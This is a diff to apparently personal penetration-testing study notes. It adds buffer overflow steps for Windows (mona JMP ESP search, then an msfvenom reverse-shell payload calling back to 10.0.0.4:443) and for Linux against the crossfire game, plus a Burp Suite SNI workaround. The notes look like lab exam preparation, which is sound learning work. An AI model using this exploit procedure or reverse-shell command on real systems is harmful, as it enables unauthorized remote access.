@@ -17,6 +17,7 @@ in the name of Allah, the most gracful the most merciful
   - [Privilege Escalation](#privilege-escalation)
 - [VMware](#vmware)
 - [Python](#python)
+- [Troubleshooting](#troubleshooting)
 - [Resources](#resources)
 - [## Diary](#diary)
 
@@ -232,6 +233,30 @@ Buffer Over Flow
   7. find bad chars by sending this payload after EIP, A*2607 + B*4 + badchars 
   8. follow esp address dump > find chars not following the pattern
   9. found something? remove it from the payload and repeat
+  10. find jump esp address in the memory
+   `!mona modules` -> Rebase, SafeSEH, ASLR, NXCompat False   
+  11. allocate the exact jsp address in the suitable dll   
+  `!mona find -s '\xff\xe4' -m slmfc.dll` -> copy memory address, make sure it doesn't contain any bad chars 
+  12. replace the 'B'*4 with the memory address you've chosen
+  13. replace the C's with shellcode preceded with "\x90"*8 
+   ` msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"` 
+  14. profit 
+
+- Linux Buffer Overflow 
+  1. `edb --run /usr/games/crossfire/bin/crossfire`
+  2. crash the app 
+  3. control EIP via pattern_create.rb
+  4. Locate where the shellcode starts? EAX?  perfect, but we need to starts at the shell code immediatly, calculate how many bytes untill you can start the shell code,  we need to control ESP register to jump 12 bytes (install fsdfa) and then jump to eax, use nasm_shell.rb
+  5. locate Jump EIP via search opcodes, EIP > ESP
+  6. shellcode + 'A'*(2603 - shellcode_length) + RET (ESP Register) + Instructions_to_add12byte_and_jump_toEAX
+
+- buffer overflow doesn't work?
+  - make sure string is sent right, inside (), using "" 
+  - make sure you don't send too much C's 
+  - 
+
+
+
 
 
 - good resource about registers
@@ -308,6 +333,12 @@ print(banner)
 s.send('command')
 s.recv(1024)
 ```
+
+Troubleshooting 
+=====================================
+- Burp ' handshake alert : unrecognized name ' 
+  - add this to BurpSuiteCommunity.vmoptions
+   `-Djsse.enableSNIExtension=false` 
 
 
 Resources
